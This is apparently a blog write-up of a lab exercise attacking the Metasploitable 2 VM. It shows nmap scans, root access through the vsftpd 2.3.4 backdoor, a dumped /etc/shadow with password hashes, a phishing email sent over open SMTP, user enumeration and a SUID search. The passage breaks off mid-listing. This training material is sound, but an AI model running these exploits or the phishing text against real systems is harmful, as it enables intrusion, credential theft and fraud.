---
layout: post
title: "Met4sploitable 2"
categories: vulnhub
author: "dib"
permalink: /vulnhub/metasp-2/
tags: vulnhub
youtubeId: _16T3zCgSI8
---

> "When solving problems, dig at the roots instead of just hacking at the leaves." <br> -- Anthony J. D'Angelo

![][1]

### 0x00 Get VM IP

<details>
  <summary>get IP address</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> nmap -sn 192.168.222.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-21 06:29 EST
Nmap scan report for 192.168.222.2
Host is up (0.0013s latency).
Nmap scan report for 192.168.222.129
Host is up (0.0024s latency).
Nmap scan report for 192.168.222.130
Host is up (0.0079s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.34 seconds

</pre>
</details>

Let's get the IP address using nmap.

### 0x01 Scanning

<details>
  <summary>nmap full scan</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> nmap -Pn -n -sV -vvvv -oA nmap_full 192.168.222.130
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-22 00:15 EST
NSE: Loaded 45 scripts for scanning.
Initiating Connect Scan at 00:15
Scanning 192.168.222.130 [1000 ports]
Discovered open port 22/tcp on 192.168.222.130
Discovered open port 3306/tcp on 192.168.222.130
Discovered open port 445/tcp on 192.168.222.130
Discovered open port 25/tcp on 192.168.222.130
Discovered open port 21/tcp on 192.168.222.130
Discovered open port 139/tcp on 192.168.222.130
Discovered open port 80/tcp on 192.168.222.130
Discovered open port 53/tcp on 192.168.222.130
Discovered open port 514/tcp on 192.168.222.130
Discovered open port 6667/tcp on 192.168.222.130
Discovered open port 2121/tcp on 192.168.222.130
Discovered open port 8180/tcp on 192.168.222.130
Discovered open port 111/tcp on 192.168.222.130
Discovered open port 23/tcp on 192.168.222.130
Discovered open port 5900/tcp on 192.168.222.130
Discovered open port 512/tcp on 192.168.222.130
Discovered open port 1099/tcp on 192.168.222.130
Discovered open port 8009/tcp on 192.168.222.130
Discovered open port 1524/tcp on 192.168.222.130
Discovered open port 6000/tcp on 192.168.222.130
Discovered open port 5432/tcp on 192.168.222.130
Discovered open port 2049/tcp on 192.168.222.130
Discovered open port 513/tcp on 192.168.222.130
Completed Connect Scan at 00:15, 1.24s elapsed (1000 total ports)
Initiating Service scan at 00:15
Scanning 23 services on 192.168.222.130
Completed Service scan at 00:15, 11.16s elapsed (23 services on 1 host)
NSE: Script scanning 192.168.222.130.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:15
Completed NSE at 00:15, 0.17s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:15
Completed NSE at 00:15, 0.06s elapsed
Nmap scan report for 192.168.222.130
Host is up, received user-set (0.0070s latency).
Scanned at 2021-02-22 00:15:35 EST for 13s
Not shown: 977 closed ports
Reason: 977 conn-refused
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
22/tcp   open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      syn-ack Linux telnetd
25/tcp   open  smtp        syn-ack Postfix smtpd
53/tcp   open  domain      syn-ack ISC BIND 9.4.2
80/tcp   open  http        syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     syn-ack 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        syn-ack netkit-rsh rexecd
513/tcp  open  login       syn-ack
514/tcp  open  tcpwrapped  syn-ack
1099/tcp open  java-rmi    syn-ack GNU Classpath grmiregistry
1524/tcp open  bindshell   syn-ack Metasploitable root shell
2049/tcp open  nfs         syn-ack 2-4 (RPC #100003)
2121/tcp open  ftp         syn-ack ProFTPD 1.3.1
3306/tcp open  mysql       syn-ack MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  syn-ack PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         syn-ack VNC (protocol 3.3)
6000/tcp open  X11         syn-ack (access denied)
6667/tcp open  irc         syn-ack UnrealIRCd
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
8180/tcp open  http        syn-ack Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

</pre>
</details>

Nmap full scan details above.

<details>
  <summary>nmap udp scan</summary>

<pre>
&nbsp;
<b>imd@kali:~/Desktop/test/metasp$</b> sudo nmap -Pn -n -sV -vvvv -sU 192.168.222.130
[sudo] password for imd: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-22 02:48 EST
NSE: Loaded 45 scripts for scanning.
Initiating ARP Ping Scan at 02:48
Scanning 192.168.222.130 [1 port]
Completed ARP Ping Scan at 02:48, 0.31s elapsed (1 total hosts)
Initiating UDP Scan at 02:48
Scanning 192.168.222.130 [1000 ports]
Increasing send delay for 192.168.222.130 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 192.168.222.130 from 50 to 100 due to 11 out of 19 dropped probes since last increase.
UDP Scan Timing: About 10.60% done; ETC: 02:52 (0:04:21 remaining)
Discovered open port 2049/udp on 192.168.222.130
Increasing send delay for 192.168.222.130 from 100 to 200 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 192.168.222.130 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.222.130 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
UDP Scan Timing: About 15.27% done; ETC: 02:54 (0:05:39 remaining)
Discovered open port 111/udp on 192.168.222.130
UDP Scan Timing: About 18.18% done; ETC: 02:56 (0:06:49 remaining)
UDP Scan Timing: About 21.10% done; ETC: 02:57 (0:07:32 remaining)
UDP Scan Timing: About 24.23% done; ETC: 02:58 (0:08:01 remaining)
UDP Scan Timing: About 46.07% done; ETC: 03:01 (0:07:27 remaining)
UDP Scan Timing: About 53.10% done; ETC: 03:02 (0:06:44 remaining)
UDP Scan Timing: About 58.48% done; ETC: 03:02 (0:05:58 remaining)
UDP Scan Timing: About 64.22% done; ETC: 03:02 (0:05:15 remaining)
UDP Scan Timing: About 69.87% done; ETC: 03:03 (0:04:30 remaining)
Discovered open port 53/udp on 192.168.222.130
UDP Scan Timing: About 75.17% done; ETC: 03:03 (0:03:44 remaining)
Discovered open port 137/udp on 192.168.222.130
UDP Scan Timing: About 80.68% done; ETC: 03:03 (0:02:56 remaining)
UDP Scan Timing: About 86.12% done; ETC: 03:03 (0:02:08 remaining)
UDP Scan Timing: About 91.25% done; ETC: 03:03 (0:01:21 remaining)
UDP Scan Timing: About 96.47% done; ETC: 03:03 (0:00:33 remaining)
Completed UDP Scan at 03:04, 997.33s elapsed (1000 total ports)
Initiating Service scan at 03:04
Scanning 70 services on 192.168.222.130
Service scan Timing: About 7.14% done; ETC: 03:16 (0:10:50 remaining)
Service scan Timing: About 14.29% done; ETC: 03:14 (0:08:06 remaining)
Service scan Timing: About 38.57% done; ETC: 03:10 (0:03:16 remaining)
Service scan Timing: About 41.43% done; ETC: 03:10 (0:03:36 remaining)
Service scan Timing: About 65.71% done; ETC: 03:09 (0:01:37 remaining)
Service scan Timing: About 74.29% done; ETC: 03:09 (0:01:20 remaining)
Completed Service scan at 03:09, 277.76s elapsed (70 services on 1 host)
NSE: Script scanning 192.168.222.130.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:09
Completed NSE at 03:09, 0.20s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:09
Completed NSE at 03:09, 3.65s elapsed
Nmap scan report for 192.168.222.130
Host is up, received arp-response (0.0035s latency).
Scanned at 2021-02-22 02:48:07 EST for 1279s
Not shown: 930 closed ports
Reason: 930 port-unreaches
PORT      STATE         SERVICE         REASON              VERSION
53/udp    open          domain          udp-response ttl 64 ISC BIND 9.4.2
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
111/udp   open          rpcbind         udp-response ttl 64 2 (RPC #100000)
113/udp   open|filtered auth            no-response
137/udp   open          netbios-ns      udp-response ttl 64 Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp   open|filtered netbios-dgm     no-response
500/udp   open|filtered isakmp          no-response
513/udp   open|filtered who             no-response
514/udp   open|filtered syslog          no-response
664/udp   open|filtered secure-aux-bus  no-response
781/udp   open|filtered hp-collector    no-response
782/udp   open|filtered hp-managed-node no-response
997/udp   open|filtered maitrd          no-response
1051/udp  open|filtered optima-vnet     no-response
1058/udp  open|filtered nim             no-response
1069/udp  open|filtered cognex-insight  no-response
1087/udp  open|filtered cplscrambler-in no-response
1088/udp  open|filtered cplscrambler-al no-response
1524/udp  open|filtered ingreslock      no-response
1718/udp  open|filtered h225gatedisc    no-response
1761/udp  open|filtered cft-0           no-response
1804/udp  open|filtered enl             no-response
1886/udp  open|filtered leoip           no-response
1900/udp  open|filtered upnp            no-response
2049/udp  open          nfs             udp-response ttl 64 2-4 (RPC #100003)
2223/udp  open|filtered rockwell-csp2   no-response
6347/udp  open|filtered gnutella2       no-response
8193/udp  open|filtered sophos          no-response
9877/udp  open|filtered unknown         no-response
16711/udp open|filtered unknown         no-response
16779/udp open|filtered unknown         no-response
17219/udp open|filtered chipper         no-response
17615/udp open|filtered unknown         no-response
18228/udp open|filtered unknown         no-response
18258/udp open|filtered unknown         no-response
19415/udp open|filtered unknown         no-response
19792/udp open|filtered unknown         no-response
20117/udp open|filtered unknown         no-response
20154/udp open|filtered unknown         no-response
20366/udp open|filtered unknown         no-response
20389/udp open|filtered unknown         no-response
20449/udp open|filtered unknown         no-response
20678/udp open|filtered unknown         no-response
21083/udp open|filtered unknown         no-response
21358/udp open|filtered unknown         no-response
21710/udp open|filtered unknown         no-response
21868/udp open|filtered unknown         no-response
21967/udp open|filtered unknown         no-response
22055/udp open|filtered unknown         no-response
26966/udp open|filtered unknown         no-response
28122/udp open|filtered unknown         no-response
32768/udp open|filtered omad            no-response
32772/udp open|filtered sometimes-rpc8  no-response
32779/udp open|filtered sometimes-rpc22 no-response
34570/udp open|filtered unknown         no-response
34892/udp open|filtered unknown         no-response
37144/udp open|filtered unknown         no-response
37444/udp open|filtered unknown         no-response
37813/udp open|filtered unknown         no-response
49172/udp open|filtered unknown         no-response
49198/udp open|filtered unknown         no-response
49205/udp open|filtered unknown         no-response
49215/udp open|filtered unknown         no-response
49226/udp open|filtered unknown         no-response
53589/udp open|filtered unknown         no-response
54114/udp open|filtered unknown         no-response
61322/udp open|filtered unknown         no-response
64080/udp open|filtered unknown         no-response
64727/udp open|filtered unknown         no-response
MAC Address: 00:0C:29:18:9F:27 (VMware)
Service Info: Host: METASPLOITABLE

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1279.83 seconds
           Raw packets sent: 1754 (51.378KB) | Rcvd: 1013 (57.463KB)

</pre>
</details>

We found multiple ports open. Let's start on FTP.

### 0x02 FTP Enumeration & Exploitation (port 21)

Our objectives:
1. We need to find out any script that shows the vsftpd and we'll scan it's FTP vulnerabilities using nmap
2. We need to find out exploit associated with this version, it could be on exploit-db, github, or any wild blog in the internet.
3. We can try to guess the login and password of FTP as we know there's a famous vulnerability known as anonymous login
4. brute force with john, hydra, ncrack, patator

<details>
  <summary>nmap script enum</summary>

<pre>
&nbsp;
<b>imd@kali:~/Desktop/test/metasp$</b> nmap -Pn -n -p21 --script ftp-anon,ftp-vsftpd-backdoor 192.168.222.130
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-21 08:45 EST
Nmap scan report for 192.168.222.130
Host is up (0.013s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      https://www.securityfocus.com/bid/48539

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds

</pre>
</details>

Before doing the scan, search for ftp vulnerabilities related to vsftpd using this command `ls /usr/share/nmap/*ftp*`. We see the results telling that anonymous login is allowed and showed a backdoor exploit with CVE:CVE-2011-2523, that when triggered it enables the remote attacker to gain root access.  

<details>
  <summary>searchsploit vsftpd</summary>

<pre>
&nbsp;
<b>imd@kali:~/Desktop/test/metasp$</b> searchsploit vsftpd 2.3.4
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                 | unix/remote/17491.rb
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</pre>
</details>

Let's do it first with metasploit

<details>
  <summary>ez root with metasploit</summary>

<pre>
&nbsp;
<b>imd@kali:~/Desktop/test/metasp$</b> msfconsole -q
[*] Starting persistent handler(s)...
<b>msf5 ></b> search vsftpd 2.3.4

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   2  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
   4  exploit/unix/http/zivif_ipcheck_exec                      2017-09-01       excellent  Yes    Zivif Camera iptest.cgi Blind Remote Command Execution


Interact with a module by name or index, for example use 4 or use exploit/unix/http/zivif_ipcheck_exec

<b>msf5 ></b> use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
<b>msf5 exploit(unix/ftp/vsftpd_234_backdoor) ></b> show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


<b>msf5 exploit(unix/ftp/vsftpd_234_backdoor) ></b> set rhosts 192.168.222.130
rhosts => 192.168.222.130
<b>msf5 exploit(unix/ftp/vsftpd_234_backdoor) ></b> run

[*] 192.168.222.130:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.222.130:21 - USER: 331 Please specify the password.
[+] 192.168.222.130:21 - Backdoor service has been spawned, handling...
[+] 192.168.222.130:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.222.130:6200) at 2021-02-23 04:00:03 -0500

id
uid=0(root) gid=0(root)

</pre>
</details>

search for the vsftpd 2.3.4, set the rhosts which in my case is 192.168.222.130, type run or exploit and now you're root. Take note that if you're planning to take OSCP exam, it is not recommended to use metasploit.

<details>
  <summary>vsftpd github exploit</summary>

<pre>
&nbsp;
<b>imd@kali:~/Desktop/test/metasp$</b> git clone https://github.com/Andhrimnirr/Python-Vsftpd-2.3.4-Exploit.git
Cloning into 'Python-Vsftpd-2.3.4-Exploit'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Unpacking objects: 100% (37/37), 9.71 KiB | 552.00 KiB/s, done.
<b>imd@kali:~/Desktop/test/metasp$</b> cd Python-Vsftpd-2.3.4-Exploit/
<b>imd@kali:~/Desktop/test/metasp/Python-Vsftpd-2.3.4-Exploit$</b> ls
exploit.py  LICENSE  README.md
<b>imd@kali:~/Desktop/test/metasp/Python-Vsftpd-2.3.4-Exploit$</b> chmod +x exploit.py 
<b>imd@kali:~/Desktop/test/metasp/Python-Vsftpd-2.3.4-Exploit$</b> ./exploit.py 
Usage ./exploit.py <İP> <PORT>
Example ./exploit.py 127.0.0.1 21
<b>imd@kali:~/Desktop/test/metasp/Python-Vsftpd-2.3.4-Exploit$</b> ./exploit.py 192.168.222.130 21
Author:İbrahim
https://github.com/Andhrimnirr/Python-Vsftpd-2.3.4-Exploit
[+] SUCCESSFUL CONNECTİON
[*] SESSION CREATED
[!] Interactive shell to check >> use command shell_check
<b>192.168.222.130@root#:</b> id
uid=0(root) gid=0(root)

<b>192.168.222.130@root#:</b> cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G9

<b>192.168.222.130@root#:</b> ifconfig
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:18:9f:27 brd ff:ff:ff:ff:ff:ff
    inet 192.168.222.130/24 brd 192.168.222.255 scope global eth0
    inet6 fe80::20c:29ff:fe18:9f27/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop qlen 1000
    link/ether 00:0c:29:18:9f:31 brd ff:ff:ff:ff:ff:ff

</pre>
</details>

Follow what's in the instructions of README.md ` ./exploit.py <IP> <PORT>` to gain root access.

<details>
  <summary>ftp anonymous login</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> ftp 192.168.222.130
Connected to 192.168.222.130.
220 (vsFTPd 2.3.4)
Name (192.168.222.130:imd): anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> pwd
257 "/"
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> 

</pre>
</details>

We tried anonymous login (user and pass = anonymous) but found nothing inside.

### 0x03 SSH  

<details>
  <summary>sslscan</summary>

<pre>
<b>imd@kali:~$</b> sslscan 192.168.222.130
Version: 2.0.0-static
OpenSSL 1.1.1h-dev  xx XXX xxxx
</pre>
</details>

Right after we scanned the host we saw port 22 is open and has `OpenSSH 4.7p1`. You might wonder if it is vulnerable or not? Well, it isn't vulnerable. Now 


### 0x04 Telnet

<details>
  <summary>Telnet access</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> telnet 192.168.222.130
Trying 192.168.222.130...
Connected to 192.168.222.130.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password: 
Last login: Sun Feb 21 06:58:17 EST 2021 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

<b>msfadmin@metasploitable:~$</b> sudo -l
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
<b>msfadmin@metasploitable:~$</b> sudo su
<b>root@metasploitable:~#</b> id
uid=0(root) gid=0(root) groups=0(root)
<b>root@metasploitable:~#</b> 

</pre>
</details>

### 0x05 SMTP

<details>
  <summary>sending phishing mail via SMTP</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> telnet 192.168.222.130 25
Trying 192.168.222.130...
Connected to 192.168.222.130.
Escape character is '^]'.
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
?
502 5.5.2 Error: command not recognized
HELP
502 5.5.2 Error: command not recognized
VRFY root
252 2.0.0 root
VRFY msfadmin
252 2.0.0 msfadmin
Mail from: root@metasploitable.localdomain
250 2.1.0 Ok
RCPT TO: msfadmin@metasploitable.localdomain             
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Good day!

This is an urgent message. We are unable to reset your password due to some technical difficulties.

Please take action immediately by sending your current password to my Whatsapp # +639123456789 / Skype account: meta-admin  

After sending the password, please wait for your new password to be emailed within 2-3 hours. 

Your cooperation is highly appreciated.

Regards,
Administrator

.
250 2.0.0 Ok: queued as 69348CBFC
421 4.4.2 metasploitable.localdomain Error: timeout exceeded
Connection closed by foreign host.

</pre>
</details>

This famous attack is called open relay attack. You need to get email password but you don't have credentials. Above example is a way on how to make a phishing email.  

<details>
  <summary>SMTP mail server</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> telnet 192.168.222.130
Trying 192.168.222.130...
Connected to 192.168.222.130.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password: 
Last login: Sun Feb 21 06:58:17 EST 2021 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

<b>msfadmin@metasploitable:~$</b> sudo -l
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
<b>msfadmin@metasploitable:~$</b> cd /var/mail
<b>msfadmin@metasploitable:/var/mail$</b> ls
msfadmin  root
<b>msfadmin@metasploitable:</b><strong>/var/mail$</strong> cd msfadmin 
-bash: cd: msfadmin: Not a directory
<b>msfadmin@metasploitable:/var/mail$</b> cat msfadmin 
From root@metasploitable.localdomain  Sun Feb 21 06:52:20 2021
Return-Path: <root@metasploitable.localdomain>
X-Original-To: msfadmin@metasploitable.localdomain
Delivered-To: msfadmin@metasploitable.localdomain
Received: from unknown (unknown [192.168.222.129])
	by metasploitable.localdomain (Postfix) with SMTP id 69348CBFC
	for <msfadmin@metasploitable.localdomain>; Sun, 21 Feb 2021 06:41:44 -0500 (EST)
Message-Id: <20210224114223.69348CBFC@metasploitable.localdomain>
Date: Sun, 21 Feb 2021 06:41:44 -0500 (EST)
From: root@metasploitable.localdomain
To: undisclosed-recipients:;

Good day!

This is an urgent message. We are unable to reset your password due to some technical difficulties.

Please take action immediately by sending your current password to my Whatsapp # +639123456789 / Skype account: meta-admin

After sending the password, please wait for your new password to be emailed within 2-3 hours.

Your cooperation is highly appreciated.

Regards,
Administrator


<b>msfadmin@metasploitable:/var/mail$</b>

</pre>
</details>

This is how it looks like when the employee user read our phishing/scam email.

<details>
  <summary>smtp users enum</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> sudo /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.222.130
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Feb 21 07:08:29 2021 #########
192.168.222.130: bin exists
192.168.222.130: backup exists
192.168.222.130: daemon exists
192.168.222.130: distccd exists
192.168.222.130: games exists
192.168.222.130: gnats exists
192.168.222.130: ftp exists
192.168.222.130: irc exists
192.168.222.130: libuuid exists
192.168.222.130: list exists
192.168.222.130: lp exists
192.168.222.130: man exists
192.168.222.130: mail exists
192.168.222.130: nobody exists
192.168.222.130: mysql exists
192.168.222.130: postfix exists
192.168.222.130: postgres exists
192.168.222.130: root exists
192.168.222.130: ROOT exists
192.168.222.130: postmaster exists
192.168.222.130: proxy exists
192.168.222.130: service exists
192.168.222.130: sshd exists
192.168.222.130: sync exists
192.168.222.130: syslog exists
192.168.222.130: sys exists
192.168.222.130: user exists
192.168.222.130: uucp exists
192.168.222.130: www-data exists
######## Scan completed at Sun Feb 21 07:08:46 2021 #########
29 results.

168 queries in 17 seconds (9.9 queries / sec)

</pre>
</details>


It shows "user" exists. As a hacker, let's try to guess the password and try the same as the username.

<details>
  <summary>ssh user</summary>

<pre>
&nbsp;
<b>imd@kali:~$</b> ssh user@192.168.222.129
The authenticity of host '192.168.222.129 (192.168.222.129)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.222.129' (RSA) to the list of known hosts.
user@192.168.222.129's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
<b>user@metasploitable:~$</b>
<b>user@metasploitable:~$</b> sudo -l
[sudo] password for user: 
Sorry, user user may not run sudo on metasploitable.
<b>user@metasploitable:~$</b> uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
<b>user@metasploitable:~$</b> lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 8.04
Release:	8.04
Codename:	hardy
<b>user@metasploitable:~$</b> 

</pre>
</details>

So how can we escalate this further? right. Let's search for suid permissions to escalate our privileges nad get root.

<details>
  <summary>suid</summary>

<pre>
&nbsp;
<b>user@metasploitable:~$</b> find / -perm -u=s 2>/dev/null                                                                                                                   
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
